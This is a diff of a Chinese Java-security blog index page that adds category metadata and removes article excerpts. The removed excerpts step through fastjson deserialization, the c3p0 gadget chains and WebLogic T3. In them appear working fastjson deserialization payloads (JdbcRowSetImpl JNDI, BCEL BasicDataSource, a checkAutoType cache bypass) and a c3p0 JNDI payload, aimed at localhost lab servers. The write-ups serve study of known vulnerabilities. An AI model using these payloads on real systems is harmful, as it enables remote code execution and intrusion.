@@ -212,8 +212,17 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2026-06-26 18:15:38" itemprop="dateModified" datetime="2026-06-26T18:15:38+08:00">2026-06-26</time>
+                <time title="修改时间：2026-06-26 21:20:31" itemprop="dateModified" datetime="2026-06-26T21:20:31+08:00">2026-06-26</time>
               </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Java%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Java安全</span></a>
+                </span>
+            </span>
 
           <br>
             <span class="post-meta-item" title="本文字数">
@@ -240,140 +249,9 @@
 <p><img src="/2026/06/23/fastjson/fastjson2.png"></p>
 <p><img src="/2026/06/23/fastjson/fastjson1.png"></p>
 <p>获得一个默认的json解析器</p>
-<p><img src="/2026/06/23/fastjson/fastjson3.png"></p>
-<p>在按json字符串去解析，匹配到了左大括号。</p>
-<p><img src="/2026/06/23/fastjson/fastjson4.png"></p>
-<p>json字符串就是一个键值对，取<code>&quot; &quot;</code>之间的键，取完之后如果不是<code>:</code>就抛异常</p>
-<p><img src="/2026/06/23/fastjson/fastjson5.png"></p>
-<p><img src="/2026/06/23/fastjson/fastjson6.png"></p>
-<p>遇到@type就得按对应的类去解析了。跟进到loadClass()</p>
-<p><img src="/2026/06/23/fastjson/fastjson7.png"></p>
-<p>先从mappings这个缓存表中获取，缓存列没有就到下面的判断，这个两个if判断是为解决loadClass()不能加载的格式，这些格式不做处理的话forName()才可以加载。可以看到是通过裁切字符串来处理的，不过我们这个类就不需要了。</p>
-<p><img src="/2026/06/23/fastjson/fastjson8.png"></p>
-<p>加载类，然后放到缓存表里，返回。</p>
-<p><img src="/2026/06/23/fastjson/fastjson9.png"></p>
-<p>获取这个类的反序列化器，跟进。</p>
-<p><img src="/2026/06/23/fastjson/fastjson10.png"></p>
-<p>这是ParserConfig的构造方法，可以看到这个ParserConfig有很多类的反序列化器，不过我们这个类是自己创的肯定不在这些反序列化器的列表了。</p>
-<p><img src="/2026/06/23/fastjson/fastjson11.png"></p>
-<p>确实没找到，跟进。</p>
-<p><img src="/2026/06/23/fastjson/fastjson12.png"></p>
-<p>还是在找，找肯定是找不到的，找到最后会到这里，如图</p>
-<p><img src="/2026/06/23/fastjson/fastjson13.png"></p>
-<p>因为找不到，所以创建一个反序列化器，他是当这个类是JavaBean来创建的，跟进。</p>
-<p><img src="/2026/06/23/fastjson/fastjson15.png"></p>
-<p>这个就是在收集这个类的信息，这三个循环会把这个类的所有方法遍历一遍，然后把符合条件的set方法、公开属性、get方法记录。我们一个一个看</p>
-<p><img src="/2026/06/23/fastjson/fastjson16.png"></p>
-<p><img src="/2026/06/23/fastjson/fastjson17.png"></p>
-<p>这个方法的长度要大于等于4，不能是static方法，返回值得是void，参数只有一个，还得以set开头。propetyName记录的是set后面的部分并且将其转成小写，在这个代码中就是age。field找的是这个类的成员变量中跟propertyName一样的。</p>
-<p><img src="/2026/06/23/fastjson/fastjson18.png"></p>
-<p>然后就是把获得的信息汇总以后封装成FieldInfo然后放到fieldList里面。在我们这个类中会有setName和setAge在这个循环中放进去。</p>
-<p>因为这个类没有pulic的成员变量所以不会进到这个循环。</p>
-<p>看一下第三个循环。</p>
-<p><img src="/2026/06/23/fastjson/fastjson19.png"></p>
-<p>找get方法，方法名大于等于4，不能是静态方法，得以get开头，不能有参数，返回值类型得是if判断里面的这些类。</p>
-<p><img src="/2026/06/23/fastjson/fastjson20.png"></p>
-<p>他会根据properyName去查重，所以说如果有setMap的话就不能放getMap了。</p>
-<p>这次进到FieldInfo看一下。</p>
-<p><img src="/2026/06/23/fastjson/fastjson21.png"></p>
-<p>其他的都不太重要主要是这一部分，这里有一个getOnly的变量，我们希望他是true理由的话后面再写。这个方法得是参数不为一的方法，但我们知道set方法的参数是一不可能满足，只能寄希望于get方法，所以我这个Person类专门整了一个Map成员变量且只有get方法。这样就能把getOnly改成true了。</p>
-<p><img src="/2026/06/23/fastjson/fastjson23.png"></p>
-<p>方法的最后new出JavaBeanInfo对象，这个方法就结束了。</p>
-<p><img src="/2026/06/23/fastjson/fastjson22.png"></p>
-<p>会到这个方法，到这个部分。如果getOnly是false的话这里的asmEnable就是true，这样的话会走到asmFactory.createJavaBeanDeserializer()，这有什么问题呢？问题就是不能调试了，很烦。为了解决这个问题才有了getOnly改成true这一部分。我们看一下getOnly是怎么发挥作用的。</p>
-<p><img src="/2026/06/23/fastjson/fastjson24.png"></p>
-<p>遍历fieldInfo，有filedInfo的getOnly时true的的话，把asmEnable关掉。</p>
-<p><img src="/2026/06/23/fastjson/fastjson25.png"></p>
-<p>开始正式的反序列化了，其实就是赋值。通过循环从filedInfo里一个个的拿，这里我门拿到的是age，然后从json字符串那age对应的值，然后检查匹不匹配。这个if else非常多，就是为了匹配各种数据。</p>
-<p><img src="/2026/06/23/fastjson/fastjson26.png"></p>
-<p>然后到这里，在创建Person实例，我们跟进去看一下。</p>
-<p><img src="/2026/06/23/fastjson/fastjson27.png"></p>
-<p>从beanInfo里面把构造函数拿过来，然后newInstance。</p>
-<p><img src="/2026/06/23/fastjson/fastjson28.png"></p>
-<p>到这里就是要赋值了，跟进去。</p>
-<p><img src="/2026/06/23/fastjson/fastjson29.png"></p>
-<p>还是一样从fieldInfo拿到方法。</p>
-<p><img src="/2026/06/23/fastjson/fastjson30.png"></p>
-<p>反射调用赋值。</p>
-<p>循环结束了就拿到反序列化以后的对象了。<br>简单看一下序列化的过程<img src="/2026/06/23/fastjson/fastjson37.png"></p>
-<p><img src="/2026/06/23/fastjson/fastjson38.png"></p>
-<p><img src="/2026/06/23/fastjson/fastjson39.png"></p>
-<p>扫描这个类的所有public方法，进行筛选总结如下:</p>
-<p>get方法:</p>
-<ul>
-<li>不能是static方法</li>
-<li>返回值不能是void，ClassLoader，</li>
-<li>参数数量得是0</li>
-<li>方法名得以get开头</li>
-<li>方法名长度要大于等于4</li>
-<li>不能是getClass()，getDeclaringClass，getMetaClass</li>
-</ul>
-<p>is方法:</p>
-<ul>
-<li>不能是static方法</li>
-<li>返回值类型的事bool</li>
-<li>参数数量得是0</li>
-<li>方法名得以is开头</li>
-<li>方法名长度要大于等于3</li>
-<li>不能是getMetaClass</li>
-</ul>
-<p>扫描这个类的所有public方法，方法不能是static，返回值不能是void，参数数量得是0，返回值不能是ClassLoader，不能是getMetaClass，方法得以get开头，方法长度要大于等于4，不能是getClass方法，不能是getDeclaringClass方法，和反序列化一样有propertyName。is开头的也可以，is开头时方法名要大于等于3，返回类型得是bool。序列化时会把这些方法都调用一遍。</p>
-<p><strong><em>总结</em></strong></p>
-<p>有@type的时候，反序列化时会调用按指定对象的符合条件的set、get方法提供了要赋值的值的方法。</p>
-<p>主要关注了类的方法。例如，就算没有name这个成员变量，只要有setName，且json字符串写了name对应的值，就可以调用。</p>
-<p><strong><em>漏洞利用</em></strong></p>
-<blockquote>
-<p>&lt;&#x3D;fastjson1.2.24</p>
-</blockquote>
-<p><img src="/2026/06/23/fastjson/fastjson31.png"></p>
-<p>不太清楚怎么找到的。可以看到有JNDI注入，DataSourceName可以控制，有setDataSourceName方法，找一下调用connect的方法。总共就三个很好整。</p>
-<p><img src="/2026/06/23/fastjson/fastjson32.png"></p>
-<p>结束了，很简单。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap://localhost:10389/cn=test,dc=example,dc=com\&quot;,\&quot;autoCommit\&quot;:\&quot;false\&quot;&#125;&quot;</span>;</span><br><span class="line">JSON.parseObject(s);</span><br></pre></td></tr></table></figure>
-
-<p>需要出网，下面这个不需要出网。</p>
-<p><img src="/2026/06/23/fastjson/fastjson33.png"></p>
-<p>这个ClassLoader在这里com.sun.org.apache.bcel.internal.util。bcel可以把$$BCEL$$这个后面部分接<code>.class</code> 字节码文件，通过特殊的编码方式（类似 Base64 变体）<strong>压缩并编码成一个纯文本字符串</strong>的字符串。然后把这个部分加载出来。关键还是这个ClassLoader只要ClassLoader是支持BCEL就好了。</p>
-<p><img src="/2026/06/23/fastjson/fastjson34.png"></p>
-<p>这个是tomcat的部分，在tomcat-dbcp。他这里有forName而且是初始化的，其中driverClassName和driverClassLoader都是可以控制的。然后就是找这个类的那一个get或set方法会调到这里。</p>
-<p><img src="/2026/06/23/fastjson/fastjson35.png"></p>
-<p>就是这个方法get方法，他会调用createDataSource()</p>
-<p><img src="/2026/06/23/fastjson/fastjson36.png"></p>
-<p>这个createDataSource又会调用createConnectionFactory()，这样就结束了。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] bytes = convert(<span class="string">&quot;/Users/ctwabc/JavaClasses/Test.class&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(bytes, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\&quot;driverClassName\&quot;:\&quot;$$BCEL$$&quot;</span> +code +<span class="string">&quot;\&quot;,\&quot;driverClassLoader\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line">JSONObject.parseObject(s);</span><br></pre></td></tr></table></figure>
-
-<p>因为会调用到getConnection所以需要序列化。</p>
-<blockquote>
-<p>&lt;&#x3D;fastjson1.2.47通杀</p>
-<p>下面的代码都是1.2.25版本的，了解一下增加了什么东西，以及绕过</p>
-</blockquote>
-<p><img src="/2026/06/23/fastjson/fastjson40.png"></p>
-<p>这个部分多了个checkAutoType(),我们看一下。</p>
-<p>默认情况下<code>autoTypeSupport</code>是<code>false</code>，<code>expectClass</code>是<code>null</code></p>
-<p>我就写成注释了</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class="line">    <span class="keyword">if</span> (typeName == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">		<span class="comment">// 如果autoTypeSupport开启了的话，进行白名单+黑名单的检测</span></span><br><span class="line">  	<span class="comment">// 白名单从配置读取，黑名单的话各版本之间都有不同，我们考虑的是默认情况不会进入到这个if里面</span></span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">accept</span> <span class="operator">=</span> acceptList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                <span class="keyword">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">		<span class="comment">// 从mappings缓存中读取，我们的绕过利用的就是这个</span></span><br><span class="line">    Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="comment">// 这个应该也算是从缓存读取</span></span><br><span class="line">        clazz = deserializers.findClass(typeName);</span><br><span class="line">    &#125;</span><br><span class="line">		<span class="comment">// 从缓存中读取到的话进行简单的判断，然后返回</span></span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">      	<span class="comment">// 因为期望类是空的不用太担心</span></span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line">  	<span class="comment">// 绕过的方法是不会走到下面的，大概了解一下</span></span><br><span class="line">		<span class="comment">// 黑名单+白名单的检测</span></span><br><span class="line">    <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">accept</span> <span class="operator">=</span> acceptList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">		<span class="comment">//默认情况下两个都是false，进不去</span></span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">        clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">    &#125;</span><br><span class="line">		</span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">				<span class="comment">// 加载的类不能是classloader,datasource</span></span><br><span class="line">        <span class="keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) <span class="comment">// classloader is danger</span></span><br><span class="line">                || DataSource.class.isAssignableFrom(clazz) <span class="comment">// dataSource can load jdbc driver</span></span><br><span class="line">                ) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line">				<span class="comment">// 有期望类的话就得匹配期望类</span></span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>找一下往mappings缓存里放的方法。</p>
-<p>总共就两个方法</p>
-<p><img src="/2026/06/23/fastjson/fastjson41.png"></p>
-<p>这个是把内置类放进缓存表里，我们是无法控制放进去的类的pass掉</p>
-<p><img src="/2026/06/23/fastjson/fastjson42.png"></p>
-<p>只剩这个了，再找一下谁调用了loadClass</p>
-<p><img src="/2026/06/23/fastjson/fastjson43.png"></p>
-<p>也就这个了，MiscCodec就是反序列化器，回忆一下如图</p>
-<p><img src="/2026/06/23/fastjson/fastjson9.png"></p>
-<p>之前流程分析的时候，有一部分就是获取反序列化器，那个时候因为这个Person类是我们自己定义的类没有对应的反序列化器，所以自己创建了一个反序列化器，而这个MiscCodec就是预先在ParserConfig里放好的反序列化器，他可以反序列化Class类，只要这个strVal可控，我们就可以把恶意类预先放到缓存里。</p>
-<p><img src="/2026/06/23/fastjson/fastjson44.png"></p>
-<p>这一部分就是给strVal赋值。</p>
-<p>总结一下</p>
-<p>@type:xxx这部分结束以后必须是val，strVal就是val对应的值部分。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap://localhost:10389/cn=test,dc=example,dc=com\&quot;,\&quot;autoCommit\&quot;:\&quot;false\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line">JSON.parseObject(s);</span><br></pre></td></tr></table></figure>
-
-<p>还没写完</p>
-<p>推荐视频:<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1bD4y117Qh/?spm_id_from=333.337.search-card.all.click&vd_source=c4cebc18d34b17376b1b2a473da11100">https://www.bilibili.com/video/BV1bD4y117Qh/?spm_id_from=333.337.search-card.all.click&amp;vd_source=c4cebc18d34b17376b1b2a473da11100</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1pP411N726?spm_id_from=333.788.videopod.sections&vd_source=c4cebc18d34b17376b1b2a473da11100">https://www.bilibili.com/video/BV1pP411N726?spm_id_from=333.788.videopod.sections&amp;vd_source=c4cebc18d34b17376b1b2a473da11100</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1bG4y157Ef?spm_id_from=333.788.videopod.sections&vd_source=c4cebc18d34b17376b1b2a473da11100">https://www.bilibili.com/video/BV1bG4y157Ef?spm_id_from=333.788.videopod.sections&amp;vd_source=c4cebc18d34b17376b1b2a473da11100</a></p>
-
+          <!--noindex-->
+          <!--/noindex-->
+        
       
     </div>
 
@@ -423,8 +301,17 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2026-06-25 22:57:54" itemprop="dateModified" datetime="2026-06-25T22:57:54+08:00">2026-06-25</time>
+                <time title="修改时间：2026-06-26 21:20:31" itemprop="dateModified" datetime="2026-06-26T21:20:31+08:00">2026-06-26</time>
               </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Java%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Java安全</span></a>
+                </span>
+            </span>
 
           <br>
             <span class="post-meta-item" title="本文字数">
@@ -446,46 +333,9 @@
       
           <p><em><strong>URLClassLoader</strong></em></p>
 <p>入口点是<code>PoolBackedDataSourceBase</code>这个类的<code>readObject</code>方法，如下图</p>
-<p><img src="/2026/06/22/c3p0/c3p01.png" alt="截图"></p>
-<p><code>PoolBackedDataSourceBase</code>有<code>connectionPoolDataSource</code>的成员变量，可以看到在<code>readObject</code>中会调用getObject方法以后会将其强转为<code>ConnectionPoolDataSource</code>类。但是<code>ConnectionPoolDataSource</code>类是不能序列化的，如图</p>
-<p><img src="/2026/06/22/c3p0/c3p02.png" alt="截图"></p>
-<p>既然不能序列化，那可以肯定的是<code>PoolBackedDataSourceBase</code>的writeObject方法肯定是做了一些处理的。</p>
-<p><img src="/2026/06/22/c3p0/c3p03.png" alt="截图"></p>
-<p>首先会尝试着将这个成员变量序列化，失败的话调用<code>ReferenceIndirector.indirectForm()</code>，我们看一下这个方法在干什么。</p>
-<p><img src="/2026/06/22/c3p0/c3p04.png" alt="截图"></p>
-<p>其实就是一层封装，封装成可以序列化的类。而且我们可以知道他是获得了<code>Reference</code>的，之前的JNDI用的就是这个。会到<code>readObject</code>方法，这次跟进一下<code>getObject</code>方法</p>
-<p><img src="/2026/06/22/c3p0/c3p05.png"></p>
-<p>本来以为这个<code>lookup</code>方法可以利用，看的文章写反序列化的时候<code>contextName</code>默认是null且不可控的。继续跟进</p>
-<p><img src="/2026/06/22/c3p0/c3p06.png" alt="截图"></p>
-<p>这个方法的流程相当眼熟了，可以说是把之前jndi流程中的reference的利用部分写到了一块地方，所以说利用点就是类的远程加载了。</p>
-<p>我猜这个链就是看到这个方法以后倒着找的。</p>
-<p><strong>利用</strong></p>
-<p><img src="/2026/06/22/c3p0/c3p07.png" alt="截图"></p>
-<p>关键就是重写这个方法了，因为<code>Reference</code>就是靠这个方法获取的。剩下的就是把它放到<code>PoolBackedDataSourceBase</code>然后序列化反序列化了。</p>
-<p><em><strong>JNDI注入</strong></em></p>
-<blockquote>
-<p> 倒着分析有逻辑一点，写起来不方便，还是顺着写吧</p>
-</blockquote>
-<p>JndiRefConnectionPoolDataSource这个类有非常多的get和set方法，其中setJndiName可以给jndiName这个属性赋值。</p>
-<p>这个类还有一个setLoginTimeout()方法。</p>
-<p><img src="/2026/06/22/c3p0/c3p08.png" alt="截图"></p>
-<p><img src="/2026/06/22/c3p0/c3p09.png" alt="截图"></p>
-<p>跟进</p>
-<p><img src="/2026/06/22/c3p0/c3p010.png" alt="截图"></p>
-<p>这个getNestedDataSource()返回的是JndiRefForwardingDataSource类，因为我们这个场景要用到的就是jndi，他返回的就是对应的类了。跟进</p>
-<p><img src="/2026/06/22/c3p0/c3p011.png" alt="截图"></p>
-<p>跟到inner()</p>
-<p><img src="/2026/06/22/c3p0/c3p012.png" alt="截图"></p>
-<p>跟进</p>
-<p><img src="/2026/06/22/c3p0/c3p013.png" alt="截图"></p>
-<p>有lookup且jndiName我们可以控制，剩下的就是jndi的流程了。</p>
-<p>也是先找到这个方法，再往前找。</p>
-<p><strong>利用</strong></p>
-<p>fastjson反序列化</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String payload = &quot;&#123;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\&quot;,\&quot;JndiName\&quot;:\&quot;rmi://localhost:1099/remoteObj\&quot;, \&quot;LoginTimeout\&quot;:0&#125;&quot;;</span><br><span class="line">JSON.parse(payload);</span><br></pre></td></tr></table></figure>
-
-<p>参考文章:<a target="_blank" rel="noopener" href="https://goodapple.top/archives/1749">https://goodapple.top/archives/1749</a></p>
-
+          <!--noindex-->
+          <!--/noindex-->
+        
       
     </div>
 
@@ -530,6 +380,22 @@
 
               <time title="创建时间：2026-06-22 16:15:09" itemprop="dateCreated datePublished" datetime="2026-06-22T16:15:09+08:00">2026-06-22</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2026-06-26 21:20:49" itemprop="dateModified" datetime="2026-06-26T21:20:49+08:00">2026-06-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Java%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Java安全</span></a>
+                </span>
+            </span>
 
           <br>
             <span class="post-meta-item" title="本文字数">
@@ -549,7 +415,9 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          
+          <span id="more"></span>
+
+
       
     </div>
 
@@ -591,9 +459,24 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2026-06-22 14:30:46 / 修改时间：16:06:59" itemprop="dateCreated datePublished" datetime="2026-06-22T14:30:46+08:00">2026-06-22</time>
+              <time title="创建时间：2026-06-22 14:30:46" itemprop="dateCreated datePublished" datetime="2026-06-22T14:30:46+08:00">2026-06-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2026-06-26 21:20:31" itemprop="dateModified" datetime="2026-06-26T21:20:31+08:00">2026-06-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Java%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Java安全</span></a>
+                </span>
             </span>
 
           <br>
@@ -616,31 +499,9 @@
       
           <p><em><strong>环境</strong></em></p>
 <p>jdk7u21 weblogic 12.1.3.0.0</p>
-<p>个人推荐使用12.1.3.0.0版本的weblogic，10.3.6版本因为太老了会报空间不足的错误，网上的解决方案不知道为什么失败了。但12.1.3版本就没有什么问题了。</p>
-<p><em><strong>T3协议</strong></em></p>
-<p>T3协议是Weblogic中独有的协议，Weblogic中RMI传输使用的就是T3协议。因为T3协议本来的目的就是为了这些反序列化和序列化，所以这个漏洞就利用上了。</p>
-<p><img src="/2026/06/22/weblogic1/weblogic4.png" alt="截图"></p>
